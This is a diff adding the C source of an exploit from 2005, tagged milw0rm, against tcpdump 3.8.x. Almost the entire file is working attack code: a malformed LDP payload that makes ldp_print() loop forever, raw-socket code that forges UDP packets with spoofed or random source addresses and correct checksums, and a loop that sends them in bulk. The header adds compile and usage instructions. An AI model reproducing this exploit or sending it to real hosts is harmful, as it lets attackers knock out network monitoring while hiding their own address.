@@ -1,0 +1,280 @@
+/*[ tcpdump[3.8.x]: (LDP) ldp_print() infinite loop DOS. ]********* 
+ *                                                                *
+ * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
+ *                                                                *
+ * compile:                                                       *
+ *  gcc xtcpdump-ldp-dos.c -o xtcpdump-ldp-dos                    *
+ *                                                                *
+ * tcpdump homepage/URL:                                          *
+ *  http://www.tcpdump.org                                        *
+ *                                                                *
+ * fix:                                                           *
+ *  this appears to have been fixed in the alpha 3.9.x / CVS      *
+ *  versions.  although i found no direct mention of the issue    *
+ *  itself being resolved, the code has been changed in a way to  *
+ *  not allow this to happen.                                     *
+ *                                                                *
+ * Tcpdump is a program that allows you to dump the traffic on a  *
+ * network. It can be used to print out the headers of packets on *
+ * a network interface that matches a given expression. You can   *
+ * use this tool to track down network problems, to detect "ping  *
+ * attacks" or to monitor the network activities.                 *
+ *                                                                *
+ * tcpdump(v3.8.3 and earlier versions) contains a remote denial  *
+ * of service vulnerability in the form of a single (LDP) packet  *
+ * causing an infinite loop.                                      *
+ *                                                                *
+ * LDP is UDP(/TCP), so no LDP service has to actually be running *
+ * to abuse this issue, spoofed or not spoofed.  depending on the *
+ * path the packet takes spoofed packets may be dropped(dropped   *
+ * at your router most likely), in such a case non-spoofed        *
+ * packets have the same effect, they just show your ip.          *
+ *                                                                *
+ * some versions of tcpdump(depending on the platform/OS) need no *
+ * special command-line arguments to allow this to happen,        *
+ * however most need the "-v" argument.                           *
+ ******************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#ifdef _USE_ARPA
+#include <arpa/inet.h>
+#endif
+
+/* doesn't seem to be standardized, so... */
+#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
+#define BYTE_ORDER __BYTE_ORDER
+#endif
+#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
+#define BIG_ENDIAN __BIG_ENDIAN
+#endif
+#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
+#if BYTE_ORDER == BIG_ENDIAN
+#define _USE_BIG_ENDIAN
+#endif
+#endif
+
+/* will never need to be changed. */
+#define LDP_PORT 646
+#define DFL_AMOUNT 5
+#define TIMEOUT 10
+
+/* avoid platform-specific header madness. */
+/* (just plucked out of header files) */
+struct iph{
+#ifdef _USE_BIG_ENDIAN
+ unsigned char version:4,ihl:4;
+#else
+ unsigned char ihl:4,version:4;
+#endif
+ unsigned char tos;
+ unsigned short tot_len;
+ unsigned short id;
+ unsigned short frag_off;
+ unsigned char ttl;
+ unsigned char protocol;
+ unsigned short check;
+ unsigned int saddr;
+ unsigned int daddr;
+};
+struct udph{
+  unsigned short source;
+  unsigned short dest;
+  unsigned short len;
+  unsigned short check;
+};
+struct sumh{
+  unsigned int saddr;
+  unsigned int daddr;
+  unsigned char fill;
+  unsigned char protocol;
+  unsigned short len;
+};
+
+/* malformed LDP data. (the bug) */
+static char payload[]=
+ "\x00\x01\xff\xff\xff\xff\xff\xff\xff"
+ "\xff\xff\xff\x00\x00\xff\xff\xff\xff";
+
+/* prototypes. (and sig_alarm) */
+void ldp_nospoof(unsigned int);
+void ldp_spoof(unsigned int,unsigned int);
+unsigned short in_cksum(unsigned short *,signed int);
+unsigned int getip(char *);
+void printe(char *,signed char);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv) {
+ unsigned char nospoof=0;
+ unsigned int amt=DFL_AMOUNT;
+ unsigned int daddr=0,saddr=0;
+ printf("[*] tcpdump[3.8.x]: (LDP) ldp_print() infinite loop DOS."
+ "\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
+ if(argc<2){
+  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
+  argv[0]);
+  printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
+  exit(1);
+ }
+ if(!(daddr=getip(argv[1])))
+  printe("invalid destination host/ip.",1);
+ if(argc>2){
+  if(strstr(argv[2],"nospoof"))nospoof=1;
+  else saddr=getip(argv[2]);
+ }
+ if(argc>3)amt=atoi(argv[3]);
+ if(!amt)printe("no packets?",1);
+ printf("[*] destination\t: %s\n",argv[1]);
+ if(!nospoof)
+  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
+ printf("[*] amount\t: %u\n\n",amt);
+ printf("[+] sending(packet = .): ");
+ fflush(stdout);
+ while(amt--){
+  /* spice things up. */
+  srandom(time(0)+amt);
+  if(nospoof)ldp_nospoof(daddr);
+  else ldp_spoof(daddr,saddr);
+  printf(".");
+  fflush(stdout);
+  usleep(50000);
+ }
+ printf("\n\n[*] done.\n");
+ fflush(stdout);
+ exit(0);
+}
+/* (non-spoofed) sends a (LDP) udp packet. */
+void ldp_nospoof(unsigned int daddr){
+ signed int sock;
+ struct sockaddr_in sa;
+ sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
+ sa.sin_family=AF_INET;
+ sa.sin_port=htons(LDP_PORT);
+ sa.sin_addr.s_addr=daddr;
+ if(sendto(sock,payload,sizeof(payload)-1,0,(struct sockaddr *)&sa,
+ sizeof(struct sockaddr))<sizeof(payload)-1)
+  printe("failed to send non-spoofed LDP packet.",1);
+ close(sock);
+ return;
+}
+/* (spoofed) generates and sends a (LDP) udp packet. */
+void ldp_spoof(unsigned int daddr,unsigned int saddr){
+ signed int sock=0,on=1;
+ unsigned int psize=0;
+ char *p,*s;
+ struct sockaddr_in sa;
+ struct iph ip;
+ struct udph udp;
+ struct sumh sum;
+ /* create raw (UDP) socket. */
+ if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_UDP))<0)
+  printe("could not allocate raw socket.",1);
+ /* allow (on some systems) for the user-supplied ip header. */
+#ifdef IP_HDRINCL
+ if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
+  printe("could not set IP_HDRINCL socket option.",1);
+#endif
+ sa.sin_family=AF_INET;
+ sa.sin_port=htons(LDP_PORT);
+ sa.sin_addr.s_addr=daddr;
+ psize=(sizeof(struct iph)+sizeof(struct udph)+sizeof(payload)-1);
+ memset(&ip,0,sizeof(struct iph));
+ memset(&udp,0,sizeof(struct udph));
+ /* values not filled = 0, from the memset() above. */
+ ip.ihl=5;
+ ip.version=4;
+ ip.tot_len=htons(psize);
+ ip.saddr=(saddr?saddr:random()%0xffffffff);
+ ip.daddr=daddr;
+ ip.ttl=(64*(random()%2+1));
+ ip.protocol=IPPROTO_UDP;
+ ip.frag_off=64;
+ udp.source=htons(random()%60000+1025);
+ udp.dest=htons(LDP_PORT);
+ udp.len=htons(sizeof(struct udph)+sizeof(payload)-1);
+ /* needed for (correct) checksums. */
+ sum.saddr=ip.saddr;
+ sum.daddr=ip.daddr;
+ sum.fill=0;
+ sum.protocol=ip.protocol;
+ sum.len=htons(sizeof(struct udph)+sizeof(payload)-1);
+ /* make sum/calc buffer for the udp checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct udph)
+ +sizeof(payload)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct sumh)+sizeof(struct udph)
+ +sizeof(payload)+1));
+ memcpy(s,&sum,sizeof(struct sumh));
+ memcpy(s+sizeof(struct sumh),&udp,sizeof(struct udph));
+ memcpy(s+sizeof(struct sumh)+sizeof(struct udph),
+ payload,sizeof(payload)-1);
+ udp.check=in_cksum((unsigned short *)s,
+ sizeof(struct sumh)+sizeof(struct udph)+sizeof(payload)-1);
+ free(s);
+ /* make sum/calc buffer for the ip checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct iph)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct iph)+1));
+ memcpy(s,&ip,sizeof(struct iph));
+ ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
+ free(s);
+ /* put the packet together. */
+ if(!(p=(char *)malloc(psize+1)))
+  printe("malloc() failed.",1);
+ memset(p,0,psize);
+ memcpy(p,&ip,sizeof(struct iph));
+ memcpy(p+sizeof(struct iph),&udp,sizeof(struct udph));
+ memcpy(p+(sizeof(struct iph)+sizeof(struct udph)),
+ payload,sizeof(payload));
+ /* send the malformed LDP packet. */
+ if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
+ sizeof(struct sockaddr))<psize)
+  printe("failed to send forged LDP packet.",1);
+ free(p);
+ return;
+}
+/* standard method for creating TCP/IP checksums. */
+unsigned short in_cksum(unsigned short *addr,signed int len){
+ unsigned short answer=0;
+ register unsigned short *w=addr;
+ register int nleft=len,sum=0;
+ while(nleft>1){
+  sum+=*w++;
+  nleft-=2;
+ }
+ if(nleft==1){
+  *(unsigned char *)(&answer)=*(unsigned char *)w;
+  sum+=answer;
+ }
+ sum=(sum>>16)+(sum&0xffff);
+ sum+=(sum>>16);
+ answer=~sum;
+ return(answer);
+}
+/* gets the ip from a host/ip/numeric. */
+unsigned int getip(char *host){
+ struct hostent *t;
+ unsigned int s=0;
+ if((s=inet_addr(host))){
+  if((t=gethostbyname(host)))
+   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
+ }
+ if(s==-1)s=0;
+ return(s);
+}
+/* all-purpose error/exit function. */
+void printe(char *err,signed char e){
+ printf("[!] %s\n",err);
+ if(e)exit(e);
+ return;
+}
+
+// milw0rm.com [2005-04-26]
